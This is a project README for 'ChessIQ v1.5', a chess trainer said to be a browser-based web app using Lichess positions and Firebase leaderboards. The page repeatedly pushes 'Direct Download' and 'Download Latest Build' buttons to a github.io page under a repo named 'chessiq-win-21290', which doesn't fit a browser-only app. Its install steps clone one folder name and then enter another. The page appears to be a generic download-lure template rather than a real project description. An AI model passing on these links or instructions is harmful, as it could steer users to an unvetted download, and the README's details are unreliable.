# ChessIQ v1.5 - chess training tool 2026

> **ChessIQ is a web-based positional chess trainer that helps players practice evaluation, strategy, and decision-making on real-game positions in version 1.5.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zimmerpierre1993/chessiq-win-21290?style=flat-square)](https://github.com/zimmerpierre1993/chessiq-win-21290)

---

<p align="center">
  <a href="https://zimmerpierre1993.github.io/chessiq-win-21290/">
    <img src="https://img.shields.io/badge/Download-ChessIQ%20Latest-brightgreen?style=for-the-badge" alt="Download ChessIQ">
  </a>
</p>

> **[Direct Download - ChessIQ v1.5](https://zimmerpierre1993.github.io/chessiq-win-21290/)**

---

[Download Latest Build](https://zimmerpierre1993.github.io/chessiq-win-21290/)

---

## About ChessIQ

ChessIQ is built for players who want to improve their sense of position, not just their tactical pattern recognition. It presents real-game positions sourced from Lichess and guides practice around how to judge an exchange, weigh plans, and understand whether a position is favorable for White, Black, or balanced.

The project is delivered as a web application using HTML and JavaScript, with Firebase-backed account and leaderboard features. That makes it useful for self-study, classroom-style training, and repeat practice sessions where tracking progress matters as much as solving the position itself.

---

## Features

- Positional puzzle training focused on strategic evaluation
- Practice drawn from real-game positions from Lichess
- White, black, and equal position evaluation modes
- Engine-based feedback for reviewing your decisions
- Difficulty modes for different training levels
- Accounts and leaderboards for tracked progress
- Progress analytics to monitor improvement over time
- Web-first implementation with mobile support planned

---

## Installation

Clone the repository or download the project files, then open the web app in a browser.

1. Fetch the source:
   - `git clone https://github.com/zimmerpierre1993/chessiq-win-21290.git
2. Enter the project folder:
   - `cd chessiq-positional-training`
3. Serve or open the HTML entry point in your preferred web environment.
4. If you use a local server, start it before launching the app so Firebase and browser features can load normally.

---

## Usage

1. Open ChessIQ in a browser.
2. Choose a difficulty mode or training path.
3. Work through the presented position and decide how you evaluate it.
4. Review the engine-based feedback after each attempt.
5. Check your account stats and leaderboard progress if enabled.

Typical workflow:
- Train with real-game positions
- Compare your evaluation against the expected assessment
- Repeat sessions to study positional themes
- Use analytics to spot recurring strengths and weaknesses

---

## Configuration

Project settings are handled in the web app and its Firebase integration.

Common configuration areas include:
- account and leaderboard setup
- training mode selection
- progress tracking preferences
- any Firebase connection values used by the app

Example configuration shape:

    {
      "firebase": {
        "projectId": "your-project-id",
        "apiKey": "your-api-key"
      },
      "training": {
        "difficulty": "medium",
        "mode": "positional"
      }
    }

If configuration is not exposed through a UI, check the app source and Firebase project settings for the relevant values.

---

## Requirements

- A modern web browser
- HTML and JavaScript support
- Firebase access for accounts and leaderboards
- Internet access if loading online game data or remote services
- Sufficient storage for browser cache and saved session data

---

## FAQ

**How do I get the latest updates?**  
Use the download link above or check the repository for the newest build and source changes.

**Where are the main settings stored?**  
Most settings are handled in the web app, with Firebase used for account-related features and leaderboard data.

**What if a position does not load correctly?**  
Refresh the page, confirm browser compatibility, and verify that any required online services are reachable.

**Can I change the training difficulty?**  
Yes. Difficulty modes are part of the training flow and can be selected during use.

**Is there mobile support?**  
Mobile support is planned, so current behavior may vary by device and browser.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
